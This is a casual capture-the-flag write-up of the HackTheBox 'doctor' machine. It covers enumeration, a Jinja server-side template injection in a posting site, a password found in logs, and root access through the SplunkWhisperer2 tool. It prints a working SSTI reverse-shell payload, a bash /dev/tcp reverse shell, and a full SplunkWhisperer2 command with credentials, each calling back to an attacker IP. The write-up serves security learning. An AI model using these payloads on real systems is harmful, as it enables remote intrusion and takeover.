---
title: "doctor"
date: 2024-09-07
draft: false
description: "HackTheBox doctor writeup"
tags: ["hackthebox", "htb", "linux", "easy"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# doctor

## Overview

- **OS:** Linux
- **IP:** 10.10.10.209
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** No
- **Lists:** N/A

### Summary

learnt how to exploit this using ssti ( server side template injection ),  used a splunk exploit called splunkwhisperer2 to get root shell.

## Enumeration


nmap scan results

{{< figure src="image.png" >}}

dirsearch

{{< figure src="image 1.png" >}}

nothing too useful

checking out port 8089

{{< figure src="image 2.png" >}}

we find here that the version of splunk that is running is 8.0.5

{{< figure src="image 3.png" >}}

we also notice that there could be a domain with the name doctors.htb

lets add this to our /etc/hosts file and visit it

{{< figure src="image 4.png" >}}

and oop we got a login page on this site, this may be useful later on 

{{< figure src="image 5.png" >}}


- **Vulnerability**


## Exploitation


the admin login panel page had a place where we could sign up  , lets do that

{{< figure src="image 6.png" >}}

{{< figure src="image 7.png" >}}


and we come across this page where we can create new posts

{{< figure src="image 8.png" >}}

{{< figure src="image 9.png" >}}

ok we put up a test post, now lets look around more

{{< figure src="image 10.png" >}}

on looking at the source page we can tell that there is a directory that exists called /archive

{{< figure src="image 11.png" >}}

the page shows nothing

but the source code shows us this

{{< figure src="image 12.png" >}}

so whatever we post is being reflected here

lets try a ssti a temp injection

**ssti :- server side template injection**

here is our ssti chart

{{< figure src="image 13.png" >}}

lets try posting this, if its vulnerable then it should show 5 , 5 times in the archive.

{{< figure src="image 14.png" >}}

{{< figure src="image 15.png" >}}

and it does, lets try a ssti rev shell payload now 

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

we can use this one 

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

we have to make some tweaks like specifying our ip nd changing cat to bash alongwith the -i command for a stable shell

{{< figure src="image 16.png" >}}

{{< figure src="image 17.png" >}}

now after we post it, we trigger the payload by refreshing the archive page, but remember to setup ur netcat first

{{< figure src="image 18.png" >}}

and there we go, we have our basic shell

{{< figure src="image 19.png" >}}

ookk so we dont even have the perms for viewing a user file.

lets get linpeas on the box and try to escalate our privs.

{{< figure src="image 20.png" >}}

after changing the perms of linpeas with chmod [x linpeas.sh](x%20linpeas%20sh%2027ec22d59dda47c5b7de5e3bf7d2737e.md) 

we run it with ./linpeas.sh

now lets see if we find anything interersting

{{< figure src="image 21.png" >}}

ok so we find a password from the logs that is Guitar123 and we know that a user exists with the name shaun.

lets try these credentials on ssh 

{{< figure src="image 22.png" >}}

does noooot seem to work, lets try on our prev shell with su

{{< figure src="image 23.png" >}}

and we are in, lets grab our user flag first

{{< figure src="image 24.png" >}}

now lets go for escalating for our root flag

remember we had come across a splunk page on port 8089 before? lets visit that now

{{< figure src="image 25.png" >}}

lets try these creds here aswell

and wow it worked 

{{< figure src="image 26.png" >}}

ok cool we can now start to use the splunkwhisperer2 payload we found earlier

git clone tis https://github.com/cnotin/SplunkWhisperer2.git 

{{< figure src="image 27.png" >}}

lets use remote and exec a rev shell payload

we will use this payload 
`bash -i >& /dev/tcp/10.10.14.39/8080 0>&1`

```python
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.39 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.39/8080 0>&1'"
```

annnnd we have our root shell

{{< figure src="image 28.png" >}}

ok now time to grab the flag

root flag

{{< figure src="image 29.png" >}}
